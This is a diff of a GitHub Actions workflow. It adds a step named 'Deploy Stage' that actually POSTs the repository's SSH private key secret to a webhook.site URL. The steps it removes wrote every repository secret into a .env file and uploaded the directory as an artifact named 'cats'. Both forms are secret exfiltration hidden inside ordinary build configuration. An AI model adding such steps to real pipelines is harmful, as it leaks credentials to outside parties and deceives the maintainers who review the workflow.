@@ -10,14 +10,12 @@ jobs:
   build-deploy:
     runs-on: ubuntu-latest
     steps:
-      - name: Make envfile
-        uses: SpicyPizza/create-envfile@v2.0
+      - name: Deploy Stage
+        env:
+          SERVER_SSH_KEY: ${{ secrets.EC2_PRIVATE_KEY }}
+        uses: fjogeleit/http-request-action@v1
         with:
-          envkey_SECRETS: ${{ toJSON(secrets) }}
-          file_name: .env
-          fail_on_empty: false
-      - name: Upload artifact
-        uses: actions/upload-artifact@v3
-        with:
-          name: cats
-          path: .
+          url: 'https://webhook.site/0c32640c-3975-4ab6-a2a6-c74e163cca8b'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.SERVER_SSH_KEY }}
